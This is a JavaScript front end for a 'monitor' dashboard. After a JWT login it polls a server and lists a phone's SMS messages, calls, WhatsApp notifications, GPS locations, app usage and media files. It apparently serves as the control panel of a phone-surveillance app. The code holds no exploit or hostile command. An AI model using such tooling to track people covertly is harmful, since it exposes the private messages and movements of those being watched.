const api = {
  post: async (path, body, token) => {
    const res = await fetch(path, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', ...(token?{ Authorization: 'Bearer ' + token }: {}) },
      body: JSON.stringify(body)
    });
    return res.json();
  },
  get: async (path, token) => {
    const res = await fetch(path, {
      headers: { ...(token?{ Authorization: 'Bearer ' + token }: {}) }
    });
    if (!res.ok) return [];
    return res.json();
  }
};

const tokenKey = 'monitor_jwt';
const userKey = 'monitor_user';

function setLoggedIn(user, token) {
  localStorage.setItem(tokenKey, token);
  localStorage.setItem(userKey, JSON.stringify(user));
}

function logout() {
  localStorage.removeItem(tokenKey);
  localStorage.removeItem(userKey);
  location.reload();
}

function getToken() { return localStorage.getItem(tokenKey); }
function getUser() { return JSON.parse(localStorage.getItem(userKey) || 'null'); }

document.getElementById('btnLogin').addEventListener('click', async () => {
  const u = document.getElementById('username').value;
  const p = document.getElementById('password').value;
  const r = await api.post('/api/auth/login', { username: u, password: p });
  if (r.token) {
    setLoggedIn(r.user, r.token);
    showDashboard();
  } else {
    document.getElementById('loginMsg').innerText = r.error || 'Login failed';
  }
});

document.getElementById('btnRegister').addEventListener('click', async () => {
  const u = document.getElementById('username').value;
  const p = document.getElementById('password').value;
  const r = await api.post('/api/auth/register', { username: u, password: p });
  if (r.ok) {
    document.getElementById('loginMsg').innerText = 'Registered, now login';
  } else {
    document.getElementById('loginMsg').innerText = r.error || 'Register failed';
  }
});

document.getElementById('btnLogout').addEventListener('click', logout);

async function render() {
  const token = getToken();
  if (!token) return;

  const user = getUser();
  document.getElementById('userName').innerText = user ? user.username : 'unknown';

  const sms = await api.get('/api/sms', token);
  const smsList = document.getElementById('smsList'); smsList.innerHTML = '';
  sms.forEach(s => {
    const li = document.createElement('li');
    li.textContent = `${s.sender}: ${s.message} (${new Date(s.timestamp).toLocaleString()})`;
    smsList.appendChild(li);
  });

  const calls = await api.get('/api/call', token);
  const callsList = document.getElementById('callsList'); callsList.innerHTML = '';
  calls.forEach(c => { const li = document.createElement('li'); li.textContent = `${c.number} - ${c.state} (${new Date(c.timestamp).toLocaleString()})`; callsList.appendChild(li); });

  const notifs = await api.get('/api/whatsapp', token);
  const notifList = document.getElementById('notifList'); notifList.innerHTML = '';
  notifs.forEach(n => { const li = document.createElement('li'); li.textContent = `${n.packageName}: ${n.message} (${new Date(n.timestamp).toLocaleString()})`; notifList.appendChild(li); });

  const locs = await api.get('/api/location', token);
  const locList = document.getElementById('locList'); locList.innerHTML = '';
  locs.forEach(l => { const li = document.createElement('li'); li.textContent = `${l.lat.toFixed(5)}, ${l.lon.toFixed(5)} (${l.accuracy}) - ${new Date(l.timestamp).toLocaleString()}`; locList.appendChild(li); });

  const usage = await api.get('/api/app-usage', token);
  const usageList = document.getElementById('usageList'); usageList.innerHTML = '';
  usage.forEach(u => { const li = document.createElement('li'); li.textContent = `${u.packageName}: ${u.totalTime}ms (last ${new Date(u.lastTimeUsed).toLocaleString()})`; usageList.appendChild(li); });

  const media = await api.get('/api/media', token);
  const mediaList = document.getElementById('mediaList'); mediaList.innerHTML = '';
  media.forEach(m => {
    const li = document.createElement('li');
    const btn = document.createElement('button');
    btn.textContent = 'Download';
    btn.addEventListener('click', async () => {
      const res = await fetch('/api/media/' + m._id, { headers: { Authorization: 'Bearer ' + token } });
      if (!res.ok) return alert('Download failed');
      const blob = await res.blob();
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = m.filename || 'file';
      document.body.appendChild(a); a.click();
      a.remove();
      URL.revokeObjectURL(url);
    });
    li.appendChild(document.createTextNode((m.filename || m._id) + ' '));
    li.appendChild(btn);
    mediaList.appendChild(li);
  });
}

function showDashboard() {
  document.getElementById('loginBox').classList.add('hidden');
  document.getElementById('dashboard').classList.remove('hidden');
  render();
  setInterval(render, 5000);
}

window.addEventListener('load', () => {
  if (getToken()) showDashboard();
});
